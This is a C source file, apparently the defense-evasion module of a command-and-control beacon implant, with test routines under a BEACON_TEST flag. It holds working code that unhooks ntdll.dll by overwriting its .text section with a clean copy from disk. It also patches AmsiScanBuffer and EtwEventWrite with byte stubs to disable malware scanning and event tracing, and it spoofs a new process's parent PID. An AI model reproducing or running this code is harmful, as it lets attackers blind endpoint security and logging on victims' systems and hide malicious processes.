#include "common.h"
#include "ntdefs.h"
#include <stdio.h>
#include<intrin.h>
#define NTDLL_NAME "NTDLL.DLL"
#define MAP_NTDLL



//  Map a clean copy of ntdll.dll from disk 
BOOL MapNtdllFromDisk(OUT PVOID *ppNtdllBuf) {
  HANDLE hFile = NULL;
  HANDLE hSection = NULL;
  CHAR cWinPath[MAX_PATH / 2] = {0};
  CHAR cNtdllPath[MAX_PATH] = {0};
  PBYTE pNtdllBuffer = NULL;

  // get Windows directory (e.g. C:\Windows)
  if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
    printf("[!] GetWindowsDirectoryA Failed With Error : %d \n",
           GetLastError());
    goto _EndOfFunc;
  }

  // build full path: C:\Windows\System32\NTDLL.DLL
  sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath,
            NTDLL_NAME);
  printf("[*] Loading clean NTDLL from: %s\n", cNtdllPath);

  // open the file
  hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
    goto _EndOfFunc;
  }

  // create a read-only section mapping
  // SEC_IMAGE_NO_EXECUTE handles PE alignment automatically
  hSection = CreateFileMappingA(
      hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
  if (hSection == NULL) {
    printf("[!] CreateFileMappingA Failed With Error : %d \n", GetLastError());
    goto _EndOfFunc;
  }

  // map the view into our process
  pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0,0);
  if (pNtdllBuffer == NULL) {
    printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
    goto _EndOfFunc;
  }

  printf("[+] Clean NTDLL mapped at: 0x%p\n", pNtdllBuffer);
  *ppNtdllBuf = pNtdllBuffer;

_EndOfFunc:
  if (hFile)
    CloseHandle(hFile);
  if (hSection)
    CloseHandle(hSection);
  if (*ppNtdllBuf == NULL)
    return FALSE;
  return TRUE;
}


PVOID FetchLocalNtdllBaseAddress() {
#ifdef _WIN64
  PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
  PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
  PLDR_DATA_TABLE_ENTRY pLdr =
      (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink
                                  ->Flink -
                              0x10);

  printf("[*] Loaded (hooked) NTDLL base: 0x%p\n", pLdr->DllBase);
  return pLdr->DllBase;
}

// Overwrite hooked .text with clean .text 
BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
  PVOID pLocalNtdll = FetchLocalNtdllBaseAddress();

  // validate DOS header
  PIMAGE_DOS_HEADER pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
  if (!pLocalDosHdr || pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
    printf("[!] Invalid DOS signature on loaded NTDLL\n");
    return FALSE;
  }

  // validate NT headers
  PIMAGE_NT_HEADERS pLocalNtHdrs =
      (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
  if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
    printf("[!] Invalid NT signature on loaded NTDLL\n");
    return FALSE;
  }

  PVOID pLocalNtdllTxt = NULL;  // hooked .text in memory
  PVOID pRemoteNtdllTxt = NULL; // clean .text from disk
  SIZE_T sNtdllTxtSize = 0;

  // find the .text section by name
  // (*(ULONG*)name | 0x20202020) == 'xet.' is a case-insensitive
  // little-endian compare for ".tex" — standard Maldev pattern
  PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);
  for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {
    if ((*(ULONG *)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
      pLocalNtdllTxt =
          (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
#ifdef MAP_NTDLL
      // MAP: VirtualAddress is valid directly — SEC_IMAGE_NO_EXECUTE handles
      // alignment
      pRemoteNtdllTxt =
          (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
#endif
      sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
      printf("[*] .text section found — VA: 0x%p | Size: %zu bytes\n",
             pLocalNtdllTxt, sNtdllTxtSize);
      break;
    }
  }

  // verify we found everything
  if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize) {
    printf("[!] Failed to locate .text section\n");
    return FALSE;
  }

  // make .text writable (PAGE_EXECUTE_WRITECOPY avoids CoW faults)
  DWORD dwOldProtection = 0;
  if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY,
                      &dwOldProtection)) {
    printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
    return FALSE;
  }

  // overwrite hooked bytes with clean bytes
  memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
  printf("[+] .text section overwritten with clean copy\n");

  // restore original memory protection
  if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection,
                      &dwOldProtection)) {
    printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
    return FALSE;
  }

  return TRUE;
}

// Wrapper: call this ONCE at top of beacon_run() 
BOOL unhook_ntdll() {
  PVOID pCleanNtdll = NULL;

  printf("[*] Starting NTDLL unhook...\n");

  // map clean copy from disk
  if (!MapNtdllFromDisk(&pCleanNtdll)) {
    printf("[!] MapNtdllFromDisk Failed\n");
    return FALSE;
  }

  // overwrite hooked .text with clean .text
  if (!ReplaceNtdllTxtSection(pCleanNtdll)) {
    printf("[!] ReplaceNtdllTxtSection Failed\n");
    UnmapViewOfFile(pCleanNtdll);
    return FALSE;
  }

  // unmap the clean copy — no longer needed
  UnmapViewOfFile(pCleanNtdll);

  printf("[+] NTDLL unhooked successfully\n");
  return TRUE;
}


BOOL patch_amsi() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        printf("[*] patch_amsi: amsi.dll not loaded (not a PowerShell host)\n");
        return TRUE; // not an error
    }

    PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        printf("[!] patch_amsi: AmsiScanBuffer not found\n");
        return FALSE;
    }

    // x64 patch: mov eax, 0x80070057 (E_INVALIDARG) ; ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD oldProtect = 0;

    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[!] patch_amsi: VirtualProtect failed: %ld\n", GetLastError());
        return FALSE;
    }

    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] AMSI patched\n");
    return TRUE;
}

BOOL patch_etw() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) {
        printf("[!] patch_etw: EtwEventWrite not found\n");
        return FALSE;
    }

    // xor eax, eax; ret (return STATUS_SUCCESS)
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
    DWORD oldProtect = 0;

    if (!VirtualProtect(pEtwEventWrite, sizeof(patch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[!] patch_etw: VirtualProtect failed: %ld\n", GetLastError());
        return FALSE;
    }

    memcpy(pEtwEventWrite, patch, sizeof(patch));
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] ETW patched\n");
    return TRUE;
}


BOOL ppid_spoof(DWORD parentPid, LPCSTR targetExe,
                PPROCESS_INFORMATION pPi) {
    STARTUPINFOEXA si = {0};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);

    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)
        HeapAlloc(GetProcessHeap(), 0, attrSize);
    if (!si.lpAttributeList) return FALSE;

    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

    HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPid);
    if (!hParent) {
        printf("[!] ppid_spoof: OpenProcess(%ld) failed: %ld\n",
               parentPid, GetLastError());
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        return FALSE;
    }

    UpdateProcThreadAttribute(si.lpAttributeList, 0,
                              PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                              &hParent, sizeof(HANDLE), NULL, NULL);

    BOOL result = CreateProcessA(
        NULL, (LPSTR)targetExe, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        NULL, NULL, &si.StartupInfo, pPi);

    if (!result) {
        printf("[!] ppid_spoof: CreateProcess failed: %ld\n", GetLastError());
    } else {
        printf("[+] ppid_spoof: Created PID %ld with PPID %ld\n",
               pPi->dwProcessId, parentPid);
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    CloseHandle(hParent);
    return result;
}
BOOL evasion_run()
{
    if(!unhook_ntdll())
    {
        printf("[!] NTDLL unhook failed\n");
        return FALSE;
    }
    patch_amsi();
    patch_etw();
    printf("[+] Evasion complete\n");
    return TRUE;

}

// ============================================================
// BEACON_TEST — evasion / NTDLL test cases
// ============================================================
#ifdef BEACON_TEST

// ── NTDLL: map clean copy from disk ─────────────────────────────────
BOOL test_ntdll_map_from_disk(void) {
    printf("\n  --- test_ntdll_map_from_disk ---\n");

    PVOID pClean = NULL;
    BOOL result = MapNtdllFromDisk(&pClean);

    printf("  [*] MapNtdllFromDisk returned: %s\n", result ? "TRUE" : "FALSE");

    if (result && pClean) {
        // Validate it looks like a PE
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pClean;
        BOOL validDos = (pDos->e_magic == IMAGE_DOS_SIGNATURE);
        printf("  [*] DOS signature (MZ): %s\n", validDos ? "VALID" : "INVALID");

        if (validDos) {
            PIMAGE_NT_HEADERS pNt =
                (PIMAGE_NT_HEADERS)((PBYTE)pClean + pDos->e_lfanew);
            BOOL validNt = (pNt->Signature == IMAGE_NT_SIGNATURE);
            printf("  [*] NT signature (PE): %s\n", validNt ? "VALID" : "INVALID");
            printf("  [*] Number of sections: %d\n",
                   pNt->FileHeader.NumberOfSections);
            printf("  [*] SizeOfImage: %lu\n",
                   pNt->OptionalHeader.SizeOfImage);
            result = validDos && validNt;
        }
        UnmapViewOfFile(pClean);
    }

    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
    return result;
}

// ── NTDLL: fetch local (hooked) base ────────────────────────────────
BOOL test_ntdll_fetch_local_base(void) {
    printf("\n  --- test_ntdll_fetch_local_base ---\n");

    PVOID pLocal = FetchLocalNtdllBaseAddress();
    BOOL result = (pLocal != NULL);

    printf("  [*] FetchLocalNtdllBaseAddress: %p\n", pLocal);

    if (result) {
        // Cross-check with GetModuleHandle
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        BOOL match = (pLocal == (PVOID)hNtdll);
        printf("  [*] GetModuleHandle(\"ntdll.dll\"): %p\n", (PVOID)hNtdll);
        printf("  [*] Addresses match: %s\n", match ? "YES" : "NO");
        result = match;
    }

    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
    return result;
}

// ── NTDLL: full unhook success ──────────────────────────────────────
BOOL test_ntdll_unhook_success(void) {
    printf("\n  --- test_ntdll_unhook_success ---\n");

    BOOL result = unhook_ntdll();
    printf("  [*] unhook_ntdll returned: %s\n", result ? "TRUE" : "FALSE");

    if (result) {
        // Verify ntdll is still functional after unhook
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        BOOL ntdllLoaded = (hNtdll != NULL);
        printf("  [*] ntdll.dll still loaded: %s\n",
               ntdllLoaded ? "YES" : "NO");

        // Verify a known export is still resolvable
        PVOID pFunc = GetProcAddress(hNtdll, "NtQuerySystemInformation");
        BOOL funcResolved = (pFunc != NULL);
        printf("  [*] NtQuerySystemInformation resolved: %s (%p)\n",
               funcResolved ? "YES" : "NO", pFunc);

        // Verify first bytes are a syscall stub (not a hook JMP)
        // Typical syscall stub starts with: mov r10, rcx (4C 8B D1)
        if (funcResolved) {
            BYTE* pBytes = (BYTE*)pFunc;
            printf("  [*] First 4 bytes: %02X %02X %02X %02X\n",
                   pBytes[0], pBytes[1], pBytes[2], pBytes[3]);
#ifdef _WIN64
            BOOL cleanStub = (pBytes[0] == 0x4C && pBytes[1] == 0x8B &&
                              pBytes[2] == 0xD1);
            printf("  [*] Looks like clean syscall stub (4C 8B D1): %s\n",
                   cleanStub ? "YES" : "NO (may still be OK)");
#else
            printf("  [*] x86 stub — manual verification needed\n");
#endif
        }

        result = ntdllLoaded && funcResolved;
    }

    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
    return result;
}

// ── NTDLL: .text section replacement ────────────────────────────────
BOOL test_ntdll_replace_text(void) {
    printf("\n  --- test_ntdll_replace_text ---\n");

    PVOID pClean = NULL;
    BOOL mapResult = MapNtdllFromDisk(&pClean);
    if (!mapResult || !pClean) {
        printf("  [!] Cannot map clean NTDLL — FAIL\n");
        printf("  --- RESULT: FAIL ---\n");
        return FALSE;
    }

    BOOL result = ReplaceNtdllTxtSection(pClean);
    printf("  [*] ReplaceNtdllTxtSection returned: %s\n",
           result ? "TRUE" : "FALSE");

    // Verify ntdll still works after .text replacement
    if (result) {
        PVOID pFunc = GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                     "NtClose");
        printf("  [*] NtClose still resolvable: %s\n",
               pFunc ? "YES" : "NO");
        result = (pFunc != NULL);
    }

    UnmapViewOfFile(pClean);
    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
    return result;
}

// ── AMSI patch: success ─────────────────────────────────────────────
BOOL test_amsi_patch_success(void) {
    printf("\n  --- test_amsi_patch_success ---\n");

    BOOL result = patch_amsi();
    printf("  [*] patch_amsi returned: %s\n", result ? "TRUE" : "FALSE");

    // If AMSI was patched, verify the patch bytes are in place
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (hAmsi) {
        PVOID pFunc = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (pFunc) {
            BYTE* p = (BYTE*)pFunc;
            // Should be: B8 57 00 07 80 C3
            BOOL patched = (p[0] == 0xB8 && p[1] == 0x57 && p[5] == 0xC3);
            printf("  [*] AmsiScanBuffer bytes: %02X %02X %02X %02X %02X %02X\n",
                   p[0], p[1], p[2], p[3], p[4], p[5]);
            printf("  [*] Patch bytes in place: %s\n",
                   patched ? "YES" : "NO");
        }
    } else {
        printf("  [*] amsi.dll not loaded — patch returned TRUE (expected)\n");
    }

    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
    return result;
}

// ── AMSI patch: not loaded (should succeed gracefully) ──────────────
BOOL test_amsi_not_loaded(void) {
    printf("\n  --- test_amsi_not_loaded ---\n");

    // If amsi.dll is not loaded in this process, patch_amsi should
    // return TRUE (it's not an error condition — just no PowerShell host)
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (hAmsi) {
        printf("  [*] SKIPPED — amsi.dll is already loaded\n");
        return TRUE;
    }

    // Don't load amsi.dll — just call patch
    printf("  [*] amsi.dll not present in process\n");
    BOOL result = patch_amsi();
    printf("  [*] patch_amsi returned: %s (expected TRUE)\n",
           result ? "TRUE" : "FALSE");

    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
    return result;
}

// ── ETW patch: success ──────────────────────────────────────────────
BOOL test_etw_patch_success(void) {
    printf("\n  --- test_etw_patch_success ---\n");

    BOOL result = patch_etw();
    printf("  [*] patch_etw returned: %s\n", result ? "TRUE" : "FALSE");

    // Verify the patch bytes
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll && result) {
        PVOID pFunc = GetProcAddress(hNtdll, "EtwEventWrite");
        if (pFunc) {
            BYTE* p = (BYTE*)pFunc;
            // Should be: 33 C0 C3 (xor eax,eax; ret)
            BOOL patched = (p[0] == 0x33 && p[1] == 0xC0 && p[2] == 0xC3);
            printf("  [*] EtwEventWrite bytes: %02X %02X %02X\n",
                   p[0], p[1], p[2]);
            printf("  [*] Patch bytes in place: %s\n",
                   patched ? "YES" : "NO");
        }
    }

    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
    return result;
}

// ── Full evasion pipeline ───────────────────────────────────────────
BOOL test_evasion_full_pipeline(void) {
    printf("\n  --- test_evasion_full_pipeline ---\n");

    BOOL result = evasion_run();
    printf("  [*] evasion_run returned: %s\n", result ? "TRUE" : "FALSE");

    // Verify ntdll is functional
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    printf("  [*] ntdll.dll handle: %p\n", (PVOID)hNtdll);

    // Verify we can still call ntdll functions
    if (hNtdll) {
        typedef NTSTATUS(NTAPI* fnRtlGetVersion)(PRTL_OSVERSIONINFOW);
        fnRtlGetVersion pRtlGetVersion =
            (fnRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
        if (pRtlGetVersion) {
            RTL_OSVERSIONINFOW osvi = {0};
            osvi.dwOSVersionInfoSize = sizeof(osvi);
            NTSTATUS status = pRtlGetVersion(&osvi);
            printf("  [*] RtlGetVersion post-unhook: NT %lu.%lu Build %lu (status=0x%08lX)\n",
                   osvi.dwMajorVersion, osvi.dwMinorVersion,
                   osvi.dwBuildNumber, status);
        }
    }

    printf("  --- RESULT: %s ---\n", result ? "PASS" : "FAIL");
    return result;
}

#endif /* BEACON_TEST */
